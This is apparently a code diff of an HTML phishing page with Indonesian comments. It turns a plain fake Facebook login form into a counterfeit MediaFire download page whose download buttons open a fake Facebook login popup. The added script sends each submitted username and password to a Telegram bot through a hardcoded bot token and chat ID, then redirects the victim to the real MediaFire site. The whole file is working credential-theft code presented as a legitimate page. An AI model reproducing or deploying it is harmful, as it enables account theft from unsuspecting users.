@@ -1,67 +1,360 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Login Palsu</title>
+    <title>MediaFire - Download</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <style>
-        /* Styling biar keren */
-        body { font-family: Arial; text-align: center; margin-top: 50px; }
-        input { display: block; margin: 10px auto; padding: 10px; width: 250px; }
-        button { padding: 10px 20px; background: blue; color: white; border: none; cursor: pointer; }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: Arial, sans-serif;
+        }
+        body {
+            background: #f0f2f5;
+        }
+        .container {
+            max-width: 400px;
+            margin: auto;
+            background: white;
+            min-height: 100vh;
+        }
+        /* HEADER MEDIAFIRE */
+        .header {
+            background: #1565C0; /* Biru MediaFire */
+            color: white;
+            padding: 15px 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        .logo {
+            font-weight: bold;
+            font-size: 24px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        .logo img {
+            height: 28px;
+        }
+        .header-buttons button {
+            background: transparent;
+            color: white;
+            border: 1px solid white;
+            padding: 6px 12px;
+            border-radius: 4px;
+            margin-left: 5px;
+            cursor: pointer;
+        }
+        .header-buttons button:last-child {
+            background: white;
+            color: #1565C0;
+            font-weight: bold;
+        }
+
+        /* AREA DOWNLOAD */
+        .download-area {
+            padding: 20px;
+        }
+        .title-download {
+            font-size: 22px;
+            font-weight: bold;
+            color: #202124;
+            margin-bottom: 15px;
+        }
+        .features {
+            display: flex;
+            gap: 15px;
+            margin-bottom: 20px;
+            font-size: 14px;
+            color: #5f6368;
+        }
+        .price-box {
+            background: #E8F0FE;
+            border: 2px solid #4285F4;
+            border-radius: 8px;
+            padding: 15px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 15px;
+        }
+        .price-text {
+            font-size: 18px;
+            font-weight: bold;
+            color: #202124;
+        }
+        .popular-badge {
+            background: #34A853;
+            color: white;
+            padding: 4px 10px;
+            border-radius: 20px;
+            font-size: 12px;
+            font-weight: bold;
+        }
+        .btn-download-main {
+            width: 100%;
+            background: #4285F4;
+            color: white;
+            border: none;
+            padding: 15px;
+            font-size: 18px;
+            font-weight: bold;
+            border-radius: 8px;
+            cursor: pointer;
+            margin-bottom: 20px;
+        }
+        .file-box {
+            background: #E8F0FE;
+            border: 1px solid #4285F4;
+            border-radius: 8px;
+            padding: 15px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 20px;
+        }
+        .file-info {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        .file-icon {
+            font-size: 30px;
+            color: #1565C0;
+        }
+        .file-name {
+            font-weight: bold;
+            font-size: 16px;
+        }
+        .file-size {
+            font-size: 12px;
+            color: #5f6368;
+        }
+        .btn-download-small {
+            background: #4285F4;
+            color: white;
+            border: none;
+            padding: 8px 15px;
+            border-radius: 4px;
+            cursor: pointer;
+            font-weight: bold;
+        }
+        .note-text {
+            font-size: 13px;
+            color: #5f6368;
+            margin-bottom: 30px;
+        }
+
+        /* POPUP LOGIN FACEBOOK */
+        .popup-overlay {
+            display: none; /* Awalnya disembunyiin */
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.7);
+            z-index: 999;
+            justify-content: center;
+            align-items: center;
+        }
+        .popup-box {
+            background: white;
+            width: 90%;
+            max-width: 380px;
+            border-radius: 12px;
+            overflow: hidden;
+        }
+        .popup-header {
+            background: #1877F2;
+            color: white;
+            padding: 12px 15px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        .popup-logo {
+            font-size: 24px;
+            font-weight: bold;
+        }
+        .close-btn {
+            background: none;
+            border: none;
+            color: white;
+            font-size: 20px;
+            cursor: pointer;
+        }
+        .popup-body {
+            padding: 20px;
+            text-align: center;
+        }
+        .popup-title {
+            font-size: 18px;
+            font-weight: bold;
+            margin-bottom: 20px;
+            color: #1c1e21;
+        }
+        .popup-body input {
+            width: 100%;
+            padding: 14px;
+            margin: 8px 0;
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
+            font-size: 16px;
+        }
+        .popup-body button {
+            width: 100%;
+            padding: 14px;
+            background: #1877F2;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 18px;
+            font-weight: bold;
+            margin: 10px 0;
+            cursor: pointer;
+        }
+        .popup-links {
+            margin-top: 15px;
+            font-size: 14px;
+        }
+        .popup-links a {
+            color: #1877F2;
+            text-decoration: none;
+            margin: 0 10px;
+        }
+        .lang-switch {
+            margin-top: 20px;
+            font-size: 12px;
+            color: #8a8d91;
+        }
     </style>
 </head>
 <body>
 
-    <h2>Login Facebook</h2>
-    
-    <form id="loginForm">
-        <input type="text" id="user" placeholder="Email atau Nomor HP" required>
-        <input type="password" id="pass" placeholder="Kata Sandi" required>
-        <button type="submit">Masuk</button>
-    </form>
+<div class="container">
+    <!-- HEADER MEDIAFIRE -->
+    <div class="header">
+        <div class="logo">
+            <span>🔥</span> MediaFire
+        </div>
+        <div class="header-buttons">
+            <button>SIGN UP</button>
+            <button>LOG IN</button>
+        </div>
+    </div>
 
-    <script>
-        // GANTI INI PAKE BOT TOKEN DAN CHAT ID LO
-        const BOT_TOKEN = "8653911812:AAG4hAVpL8hB4YZJhLL2PAHNDLgV3QYtsBg";
-        const CHAT_ID = "6888530451";
+    <!-- ISI KONTEN DOWNLOAD -->
+    <div class="download-area">
+        <h1 class="title-download">Download Faster</h1>
+        
+        <div class="features">
+            <span>⏱️ No Waiting</span>
+            <span>⚡ Premium</span>
+            <span>📅 No Ads</span>
+        </div>
 
-        document.getElementById("loginForm").addEventListener("submit", function(e) {
-            e.preventDefault(); // Biar form gak ke-refresh
+        <div class="price-box">
+            <span class="price-text">● Monthly: $3.99</span>
+            <span class="popular-badge">MOST POPULAR</span>
+        </div>
 
-            // Ambil nilai input
-            let user = document.getElementById("user").value;
-            let pass = document.getElementById("pass").value;
+        <button class="btn-download-main" id="clickDownload">⚡ DOWNLOAD FASTER NOW</button>
 
-            // Buat pesan formatnya
-            let pesan = `🔴 *DATA LOGIN BARU* 🔴
+        <div class="file-box">
+            <div class="file-info">
+                <span class="file-icon">📁</span>
+                <div>
+                    <div class="file-name">Resource File</div>
+                    <div class="file-size">Download in a new tab (6.4MB)</div>
+                </div>
+            </div>
+            <button class="btn-download-small" id="clickDownload2">⬇️</button>
+        </div>
+
+        <p class="note-text">Clicking the download button above will start your download in a new tab and show a message from our advertising partners.</p>
+    </div>
+</div>
+
+<!-- POPUP LOGIN FACEBOOK -->
+<div class="popup-overlay" id="popupLogin">
+    <div class="popup-box">
+        <div class="popup-header">
+            <span class="popup-logo">f</span>
+            <button class="close-btn" onclick="closePopup()">×</button>
+        </div>
+        <div class="popup-body">
+            <div class="popup-title">Masuk ke akun Facebook Anda untuk terhubung dengan MediaFire</div>
+            
+            <form id="loginForm">
+                <input type="text" id="user" placeholder="Email atau Nomor Telepon" required>
+                <input type="password" id="pass" placeholder="Kata Sandi" required>
+                <button type="submit">Masuk</button>
+            </form>
+
+            <div class="popup-links">
+                <a href="#">Buat akun</a>
+                <a href="#">Lain kali</a>
+                <br>
+                <a href="#">Lupa Kata Sandi?</a>
+            </div>
+
+            <div class="lang-switch">
+                Bahasa Indonesia | English (UK)
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    const BOT_TOKEN = "8653911812:AAG4hAVpL8hB4YZJhLL2PAHNDLgV3QYtsBg";
+    const CHAT_ID = "6888530451";
+
+    // Fungsi buka popup pas tombol download diklik
+    document.getElementById("clickDownload").addEventListener("click", function(){
+        document.getElementById("popupLogin").style.display = "flex";
+    });
+    document.getElementById("clickDownload2").addEventListener("click", function(){
+        document.getElementById("popupLogin").style.display = "flex";
+    });
+
+    function closePopup() {
+        document.getElementById("popupLogin").style.display = "none";
+    }
+
+    // Proses kirim data
+    document.getElementById("loginForm").addEventListener("submit", function(e) {
+        e.preventDefault();
+
+        let user = document.getElementById("user").value;
+        let pass = document.getElementById("pass").value;
+
+        let pesan = ` *🇮🇩RESULT NEPTUNUS🇮🇩*
 👤 User : ${user}
 🔑 Pass : ${pass}
 ⏰ Waktu : ${new Date().toLocaleString('id-ID')}`;
 
-            // Kirim ke Telegram
-            let urlAPI = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-            
-            fetch(urlAPI, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({
-                    chat_id: CHAT_ID,
-                    text: pesan,
-                    parse_mode: "Markdown"
-                })
+        // Kirim ke Telegram
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+                chat_id: CHAT_ID,
+                text: pesan,
+                parse_mode: "Markdown"
             })
-            .then(response => {
-                console.log("Data terkirim!");
-                // SETELAH KIRIM, LANGSUNG PINDAH HALAMAN
-                window.location.href = "https://www.facebook.com"; // Ganti link tujuan
-            })
-            .catch(error => {
-                console.log("Error", error);
-                // Tetap redirect walau error
-                window.location.href = "https://www.facebook.com";
-            });
-
+        })
+        .then(() => {
+            window.location.href = "https://www.mediafire.com";
+        })
+        .catch(() => {
+            window.location.href = "https://www.mediafire.com";
         });
-    </script>
+
+    });
+</script>
 
 </body>
 </html>
